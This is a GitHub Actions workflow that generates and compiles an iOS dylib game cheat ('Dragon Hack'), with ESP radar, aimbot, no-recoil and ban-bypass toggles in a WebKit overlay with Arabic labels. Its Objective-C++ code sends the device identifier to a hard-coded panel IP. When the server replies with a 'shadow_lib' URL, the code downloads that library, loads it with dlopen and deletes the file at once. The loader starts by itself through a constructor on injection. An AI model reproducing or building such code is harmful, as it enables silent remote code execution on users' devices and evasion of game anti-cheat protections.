name: 🐲 DRAGON HACK - CHEETO EDITION (iOS)

on:
  push:
    branches: [ "main", "master" ]
  workflow_dispatch: 

env:
  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true

jobs:
  build_dragon:
    name: صهر محرك الشيتو (محمد الشمري)
    runs-on: macos-latest

    steps:
      - name: 📥 جلب المستودع
        uses: actions/checkout@v4

      # ========================================================
      # 1. التوليد البرمجي (Objective-C++ & C++ & WebKit)
      # ========================================================
      - name: 📝 توليد محرك دراكون (wsam.mm)
        run: |
          cat << 'EOF' > wsam.mm
          #define _DARWIN_C_SOURCE 
          #import <Foundation/Foundation.h>
          #import <UIKit/UIKit.h>
          #import <WebKit/WebKit.h>
          #include <iostream>
          #include <string>
          #include <thread>
          #include <vector>
          #include <dlfcn.h>
          #include <unistd.h>
          #include "json.hpp" // مكتبة معالجة بيانات السيرفر

          using json = nlohmann::json;
          using namespace std;

          // ==========================================================
          // 1. [إحداثيات الرادار والمميزات - Offsets] 🎯
          // ==========================================================
          uintptr_t GWORLD_ADDR = 0x11223344; 
          uintptr_t GNAMES_ADDR = 0x55667788; 
          
          uintptr_t OFF_ACTOR_ARRAY = 0xA0;    // مصفوفة اللاعبين
          uintptr_t OFF_HEALTH      = 0x988;   // الصحة
          uintptr_t OFF_NAME        = 0x640;   // الاسم
          uintptr_t OFF_BONE        = 0x5B0;   // الهيكل العظمي
          
          uintptr_t OFF_NO_RECOIL   = 0x1A2B3C; // ثبات السلاح
          uintptr_t OFF_AIMBOT      = 0x4D5E6F; // الإيمبوت

          // ==========================================================
          // 2. [إعدادات السيرفر وحقن الشادو] 🌐
          // ==========================================================
          const string SERVER_URL = "http://34.204.178.160/panel.php?api=check";
          bool g_IsLoggedIn = false;
          bool g_IsServerFrozen = false; 

          // [شرح]: دالة سحب وحقن وحذف دايلب الشادو من السيرفر أونلاين
          void DownloadAndInjectShadow(string url) {
              if (url.empty()) return;
              @autoreleasepool {
                  NSURL *dylibURL = [NSURL URLWithString:[NSString stringWithUTF8String:url.c_str()]];
                  NSData *data = [NSData dataWithContentsOfURL:dylibURL];
                  if (data) {
                      NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"shadow.dylib"];
                      [data writeToFile:path atomically:YES];
                      void* handle = dlopen([path UTF8String], RTLD_NOW); // حقن بالذاكرة
                      if (handle) unlink([path UTF8String]); // حذف فيزيائي فوراً!
                  }
              }
          }

          // [شرح]: الاتصال بلوحة PHP وجلب حالة الحماية والأوفستات
          string SyncWithServer(string key) {
              string result = "{\"status\":\"error\"}";
              @autoreleasepool {
                  NSString *hwid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
                  NSString *urlStr = [NSString stringWithFormat:@"%s&key=%s&hwid=%@", SERVER_URL.c_str(), key.c_str(), hwid];
                  NSData *data = [NSData dataWithContentsOfURL:[NSURL URLWithString:urlStr]];
                  if(data) {
                      result = string((char*)[data bytes], [data length]);
                      auto res = json::parse(result);
                      if(res["server_state"] == "danger") g_IsServerFrozen = true;
                      if(res["status"] == "success") {
                          g_IsLoggedIn = true;
                          if (res.contains("shadow_lib")) DownloadAndInjectShadow(res["shadow_lib"].get<string>());
                      }
                  }
              }
              return result;
          }

          // ==========================================================
          // 3. [واجهة الويب الملكية - رسومات الشيتو] 🎨
          // ==========================================================
          const char* HTML_UI = R"HTML(
          <!DOCTYPE html>
          <html lang="ar" dir="rtl">
          <head>
              <meta charset="UTF-8">
              <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
              <style>
                  :root { --cyan: #00e5ff; --bg: #0b0f13; --panel: #161c24; --green: #00ff66; --red: #ff3366; }
                  body { margin: 0; padding: 0; font-family: sans-serif; background: transparent; height: 100vh; overflow: hidden; color: #fff; pointer-events: none; }
                  .interactive { pointer-events: auto; }

                  /* ================= رادار الشيتو (Cheeto Style) ================= */
                  #esp-radar { position: fixed; inset: 0; z-index: 50; display: none; }
                  .radar-origin { position: absolute; top: 10px; left: 50%; width: 12px; height: 12px; background: var(--red); border-radius: 50%; transform: translateX(-50%); box-shadow: 0 0 15px var(--red); }
                  .radar-count { position: absolute; top: 25px; left: 50%; transform: translateX(-50%); color: var(--green); font-size: 14px; font-weight: 900; text-shadow: 1px 1px 2px #000; letter-spacing: 1px; }
                  
                  /* محاكاة اللاعب والأخطوط والأسهم */
                  .player-box { position: absolute; top: 40%; left: 30%; width: 65px; height: 140px; border: 1px solid var(--green); display: none; }
                  .player-line { position: absolute; top: 10px; left: 50%; width: 2px; height: 40%; background: linear-gradient(to bottom, var(--red), var(--green)); transform-origin: top; transform: rotate(30deg); opacity: 0.6; }
                  .cheeto-arrow { position: absolute; top: 30%; left: 28%; color: var(--green); font-size: 24px; animation: float 1s infinite alternate; }
                  @keyframes float { from { transform: translateY(0); } to { transform: translateY(-10px); } }

                  /* ================= شاشة التجميد (الصيانة) ================= */
                  #freeze-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }

                  /* ================= اللوكن الملكي (Centered) ================= */
                  #login-screen { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 5000; display: flex; align-items: center; justify-content: center; }
                  .login-card { background: var(--panel); padding: 35px; border-radius: 20px; border: 1px solid #30363d; width: 330px; text-align: center; border-top: 4px solid var(--cyan); box-shadow: 0 30px 100px #000; }
                  .key-in { width: 100%; padding: 15px; background: #010409; border: 1px solid #333; color: var(--cyan); text-align: center; border-radius: 10px; margin-bottom: 20px; font-family: monospace; font-size: 18px; outline: none; }
                  .btn-act { width: 100%; padding: 15px; background: var(--cyan); color: #000; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 16px; }

                  /* ================= المنيو الإمبراطوري ================= */
                  #main-menu { position: absolute; top: 60px; left: 20px; width: 350px; background: rgba(13, 17, 23, 0.98); border: 1px solid #30363d; border-radius: 15px; z-index: 1500; display: none; flex-direction: column; box-shadow: 0 20px 80px rgba(0,0,0,0.9); border-top: 3px solid var(--cyan); }
                  .m-head { padding: 15px; background: linear-gradient(90deg, #161b22, #0d1117); border-bottom: 1px solid #30363d; font-weight: 900; display: flex; justify-content: space-between; font-size: 14px; color: var(--cyan); cursor: move; }
                  .m-content { padding: 20px; max-height: 500px; overflow-y: auto; }

                  /* بطاقة الاشتراك VIP */
                  .vip-card { border: 1px solid rgba(0,229,255,0.3); background: rgba(0,229,255,0.03); padding: 15px; border-radius: 12px; margin-bottom: 20px; border-right: 4px solid var(--cyan); position: relative; }
                  .led-box { display: flex; gap: 10px; margin-top: 10px; }
                  .led-item { display: flex; align-items: center; gap: 5px; font-size: 10px; font-weight: bold; background: rgba(0,0,0,0.5); padding: 4px 8px; border-radius: 10px; }
                  .dot { width: 8px; height: 8px; border-radius: 50%; box-shadow: 0 0 8px currentColor; }
                  .blink { animation: pulse 1.5s infinite; }
                  @keyframes pulse { 50% { opacity: 0.2; } }

                  /* القوائم المنسدلة */
                  .drop-btn { width: 100%; padding: 14px; background: #1c2128; border: 1px solid #30363d; color: #fff; text-align: right; border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; font-weight: bold; }
                  .drop-content { display: none; padding: 10px; border-right: 2px solid var(--cyan); background: rgba(255,255,255,0.01); margin-bottom: 12px; }

                  /* السويتشات */
                  .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.03); align-items: center; font-size: 13px; }
                  .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
                  .switch input { opacity: 0; width: 0; height: 0; }
                  .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #30363d; transition: .3s; border-radius: 34px; }
                  .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: #8b949e; transition: .3s; border-radius: 50%; }
                  input:checked + .slider { background-color: var(--cyan); }
                  input:checked + .slider:before { transform: translateX(20px); background-color: #000; }

                  .rights { text-align: center; font-size: 10px; color: #555; margin-top: 20px; border-top: 1px solid #222; padding-top: 10px; }
              </style>
          </head>
          <body>

              <!-- تجميد النظام -->
              <div id="freeze-screen">
                  <h1 style="color:var(--red)">SYSTEM FROZEN</h1>
                  <p id="freezeMsg">تحت الصيانة الفنية من قبل محمد الشمري...</p>
              </div>

              <!-- رادار الشيتو -->
              <div id="esp-radar">
                  <div class="radar-origin"></div>
                  <div class="radar-count">الأعـداء: 1</div>
                  <div class="player-line" id="line1"></div>
                  <div class="cheeto-arrow" id="arrow1">🔽</div>
                  <div class="player-box" id="box1">
                      <div style="position:absolute; top:-20px; width:100%; text-align:center; font-size:10px;">BOT [120m]</div>
                      <div style="position:absolute; left:-6px; bottom:0; width:3px; height:80%; background:var(--green);"></div>
                  </div>
              </div>

              <!-- شاشة اللوكن -->
              <div id="login-screen" class="interactive">
                  <div class="login-card">
                      <h2 style="color:var(--cyan); margin:0;">DRAGON HACK</h2>
                      <p style="color:#8b949e; font-size:12px; margin-bottom:25px;">برمجة المهندس محمد الشمري</p>
                      <input type="text" id="key" class="key-in" placeholder="أدخل مفتاح التفعيل">
                      <button class="btn-act" onclick="doLogin()">تسجيل الدخول</button>
                      <p id="err" style="color:var(--red); font-size:11px; margin-top:15px; display:none;">فشل الاتصال!</p>
                  </div>
              </div>

              <!-- المنيو الرئيسي -->
              <div id="main-menu" class="interactive">
                  <div class="m-header" id="dragH">دراكون الملكي | محمد الشمري <span onclick="toggleMenu()" style="cursor:pointer">✕</span></div>
                  <div class="m-content">
                      <div class="vip-card">
                          <div style="color:var(--cyan); font-weight:bold; font-size:14px;">المشترك: محمد الشمري (VIP)</div>
                          <div style="font-size:12px; color:#8b949e; margin-top:5px;">الانتهاء: <span id="exp">14/04/2026</span></div>
                          <div class="led-box">
                              <div class="led-item" style="color:var(--green)"><div class="dot blink" style="background:currentColor"></div> متصل</div>
                              <div class="led-item" id="protectLed" style="color:var(--green)"><div class="dot" style="background:currentColor"></div> آمن</div>
                          </div>
                      </div>

                      <div class="drop-btn" onclick="toggleDrop('c1')">🛡️ الحماية وتخطي الباند <span>▼</span></div>
                      <div class="drop-content" id="c1">
                          <div class="row"><span>تفعيل الحماية (Bypass)</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
                          <div class="row"><span>تخطي باند 10 دقايق</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
                          <div class="row"><span>حقن حماية الشادو أونلاين</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
                      </div>

                      <div class="drop-btn" onclick="toggleDrop('c2')">👁️ رادار الشيتو (ESP) <span>▼</span></div>
                      <div class="drop-content" id="c2">
                          <div class="row"><span>تفعيل الرادار الرئيسي</span> <label class="switch"><input type="checkbox" onchange="toggleESP(this.checked)" checked><span class="slider"></span></label></div>
                          <div class="row"><span>🏷️ الاسم والصحة</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
                          <div class="row"><span>🔲 صندوق اللاعب</span> <label class="switch"><input type="checkbox" checked><span class="slider"></span></label></div>
                          <div class="row"><span>☠️ الهيكل العظمي</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
                          <div class="row"><span style="color:var(--red)">📍 خطوط اللاين (Snaplines)</span> <label class="switch"><input type="checkbox" onchange="toggleLines(this.checked)" checked><span class="slider"></span></label></div>
                      </div>

                      <div class="drop-btn" onclick="toggleDrop('c3')">🎯 التفعيلات القتالية (Aim) <span>▼</span></div>
                      <div class="drop-content" id="c3">
                          <div class="row"><span>🔫 ثبات السلاح 100%</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
                          <div class="row"><span>🎯 ايمبوت ذكي (Cheeto)</span> <label class="switch"><input type="checkbox"><span class="slider"></span></label></div>
                      </div>

                      <div class="rights">جميع الحقوق محفوظة للمطور محمد الشمري © 2026</div>
                  </div>
              </div>

              <script>
                  // حفظ الكود تلقائياً
                  window.onload = () => { if(localStorage.getItem('k')) document.getElementById('key').value = localStorage.getItem('k'); };
                  
                  function doLogin() {
                      let k = document.getElementById('key').value;
                      localStorage.setItem('k', k);
                      window.webkit.messageHandlers.wmaster.postMessage(JSON.stringify({action:"login", key:k}));
                  }

                  function onLoginResponse(resStr) {
                      let res = JSON.parse(resStr);
                      if (res.status === 'success') {
                          document.getElementById('login-screen').style.display = 'none';
                          document.getElementById('main-menu').style.display = 'flex';
                          document.getElementById('esp-radar').style.display = 'block';
                      } else if (res.status === 'freeze') {
                          document.getElementById('login-screen').style.display = 'none';
                          document.getElementById('freeze-screen').style.display = 'flex';
                      } else { document.getElementById('err').style.display = 'block'; }
                  }

                  function toggleESP(s) { document.getElementById('box1').style.display = s?'block':'none'; document.getElementById('arrow1').style.display = s?'block':'none'; }
                  function toggleLines(s) { document.getElementById('line1').style.display = s?'block':'none'; }
                  function toggleMenu() { let m = document.getElementById('main-menu'); m.style.display = m.style.display==='none'?'flex':'none'; }
                  function toggleDrop(id) { let d = document.getElementById(id); d.style.display = d.style.display==='block'?'none':'block'; }
                  document.body.addEventListener('touchstart', e => { if(e.touches.length === 3) toggleMenu(); });

                  // نظام السحب
                  let win = document.getElementById("main-menu"), head = document.getElementById("dragH"), p1=0, p2=0, p3=0, p4=0;
                  head.ontouchstart = (e) => { p3=e.touches[0].clientX; p4=e.touches[0].clientY; document.ontouchend = () => document.ontouchmove = null; document.ontouchmove = (ev) => { ev.preventDefault(); p1=p3-ev.touches[0].clientX; p2=p4-ev.touches[0].clientY; p3=ev.touches[0].clientX; p4=ev.touches[0].clientY; win.style.top=(win.offsetTop-p2)+"px"; win.style.left=(win.offsetLeft-p1)+"px"; }; };
              </script>
          </body>
          </html>
          )HTML";

          @interface WMasterMenu : UIViewController <WKScriptMessageHandler>
          @property (nonatomic, strong) WKWebView *webView;
          @end
          @implementation WMasterMenu
          - (void)viewDidLoad {
              [super viewDidLoad];
              self.view.backgroundColor = [UIColor clearColor];
              WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
              [config.userContentController addScriptMessageHandler:self name:@"wmaster"];
              self.webView = [[WKWebView alloc] initWithFrame:self.view.bounds configuration:config];
              self.webView.backgroundColor = [UIColor clearColor];
              self.webView.opaque = NO;
              self.webView.scrollView.bounces = NO;
              [self.view addSubview:self.webView];
              [self.webView loadHTMLString:[NSString stringWithUTF8String:HTML_UI] baseURL:nil];
          }
          - (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
              NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:[message.body dataUsingEncoding:NSUTF8StringEncoding] options:0 error:nil];
              if ([dict[@"action"] isEqualToString:@"login"]) {
                  dispatch_async(dispatch_get_global_queue(0, 0), ^{
                      string res = SyncWithServer(string([dict[@"key"] UTF8String]));
                      dispatch_async(dispatch_get_main_queue(), ^{
                          [self.webView evaluateJavaScript:[NSString stringWithFormat:@"onLoginResponse('%@')", [NSString stringWithUTF8String:res.c_str()]] completionHandler:nil];
                      });
                  });
              }
          }

          // 🛡️ حل تجمد اللمس (HitTest العبقري)
          - (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
              if (g_IsServerFrozen || !g_IsLoggedIn) return [super.view hitTest:point withEvent:event];
              UIView *hitView = [super.view hitTest:point withEvent:event];
              if (hitView == self.view || hitView == self.webView.scrollView || hitView == self.webView) return nil;
              return hitView;
          }
          @end

          @interface WMasterLoader : NSObject
          + (void)inject;
          @end
          @implementation WMasterLoader
          + (void)inject {
              dispatch_async(dispatch_get_main_queue(), ^{
                  UIWindow *mainWindow = nil;
                  for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
                      if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                          for (UIWindow *window in ((UIWindowScene *)scene).windows) { if (window.isKeyWindow) { mainWindow = window; break; } }
                      }
                  }
                  if (mainWindow && mainWindow.rootViewController) {
                      WMasterMenu *menuVC = [[WMasterMenu alloc] init];
                      [mainWindow addSubview:menuVC.view];
                      menuVC.view.frame = mainWindow.bounds;
                      [mainWindow bringSubviewToFront:menuVC.view];
                  } else {
                      dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{ [self inject]; });
                  }
              });
          }
          @end
          __attribute__((constructor))
          void Start() { [WMasterLoader inject]; }
          EOF

      - name: 🛠️ تجهيز Xcode SDK
        run: sudo xcode-select -s /Applications/Xcode.app/Contents/Developer

      - name: 🔥 عملية الصهر (Cheeto Engine)
        run: |
          curl -sSL -o json.hpp https://raw.githubusercontent.com/nlohmann/json/develop/single_include/nlohmann/json.hpp
          mkdir -p out
          xcrun --sdk iphoneos clang++ -x objective-c++ -arch arm64 -dynamiclib -std=c++17 -O3 -fobjc-arc \
          -I. wsam.mm \
          -framework Foundation -framework UIKit -framework WebKit \
          -o out/WMASTER_Dragon_Cheeto.dylib

      - name: 📦 ضغط الملف للتحميل
        run: |
          cd out
          zip DRAGON-HACK.zip WMASTER_Dragon_Cheeto.dylib

      - name: 📤 استخراج الهاك النهائي
        uses: actions/upload-artifact@v4
        with:
          name: DRAGON-HACK-CHEETO
          path: out/DRAGON-HACK.zip
